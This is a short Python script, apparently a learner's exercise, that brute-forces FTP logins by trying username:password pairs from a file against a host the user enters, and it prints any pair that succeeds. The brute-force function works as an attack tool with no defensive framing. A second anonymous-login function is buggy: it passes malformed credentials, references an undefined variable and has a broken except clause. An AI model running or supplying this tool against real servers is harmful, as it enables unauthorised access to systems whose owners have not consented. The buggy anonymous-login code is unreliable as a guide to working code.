#!/usr/bin/python

import ftplib

def bruteLogin(hostname, passwdFile):
	try:
		pf = open(passwdFile,"r")
	except:
		print("[!! FileDoesnot Exist!")
	for line in pf.readlines():
		username = line.split(':')[0]
		password = line.split(':')[1].strip('\n')
		print("[+] Trying :" + username + "/" + password)
		try:
			ftp = ftplib.FTP(hostname)
			login = ftp.login(username, password)
			print("[+] Found the password and Login Sucessed" + username + " /" + password)
			ftp.quit()
			return(username,password)
		except Exception as e:
			print("excpetion"  + username + " " + password)



def annonLogin(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('anonymus;,anonymus')
		print("[*] "  + Hostname +" FRP Anonymus logon Succceded.")
		ftp.quit()
		return True
	except e:
		print("[-]" + hostname + " FTP Anonymus Login failed.")


host = input("Enter The Ip Address : ")
passwdFile =  input("Enter Username and Password file: ")
bruteLogin(host, passwdFile)
